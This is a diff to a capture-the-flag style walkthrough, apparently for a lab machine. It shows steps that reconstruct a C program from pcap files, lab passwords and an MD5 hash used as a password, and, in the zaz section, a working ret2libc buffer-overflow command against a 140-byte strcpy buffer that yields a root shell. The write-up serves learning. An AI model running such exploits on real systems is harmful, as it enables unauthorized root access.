@@ -69,9 +69,9 @@ After unzipping (* tar -xf fun *)
 There is a folder * ft_fun * with a lot of pcap files.
 
 These files have c code, and comments which number/line it has.
-So we need to write script which will correct concat them into c file. (script attached)
-And the name of this script is "build_program.py". Run it to get full program.
-Compile and run this program. Got "Iheartpwnage" password and advice to use sha-256.
+So we need to write script which will correct concat them into c file.
+We can use our "build_program.py" script inside this folder to get full program.
+Compile and run "prog.c". Got "Iheartpwnage" password and advice to use sha-256.
 
 ### laurie
 ```
@@ -135,11 +135,12 @@ README says to remove spaces when we have FULL the password. Ok, lets concatenat
 ### thor
 Use our "parse_turtle_steps.py" script and look at word "SLASH".
 ```
-md5 -s SLASH -> "646da671ca01bb5d84dbb5fb2238dc8e" password for zaz.
+md5 -s SLASH
 ```
+"646da671ca01bb5d84dbb5fb2238dc8e" is password for zaz.
 
 ### zaz
-You can see expolit_me file there. This program takes argument and prints it. With decompiled code we can see that there is only 140 bytes buffer inside main. And strcpy uses here. Excellent opportunity to overflow buffer and use ret2lib exploit.
+You can see expolit_me file there. This program takes argument and prints it. With decompiled code we can see that there is only 140 bytes buffer inside main. And strcpy is uding here. Excellent opportunity to overflow buffer and use ret2lib exploit.
 
 We need to know system command adress and '/bin/bash' string address.
 
@@ -153,7 +154,7 @@ gdb exploit_me
 
 Now we can run this command
 ```
-./exploit_me $(python -c "print('a' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'aaaa' + '\xb7\xf8\xcc\x58'[::-1])")
+./exploit_me $(python -c "print('a' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'dumm' + '\xb7\xf8\xcc\x58'[::-1])")
 ```
 
 Whaaat is going on? Whoami? A im root! System has been hacked.
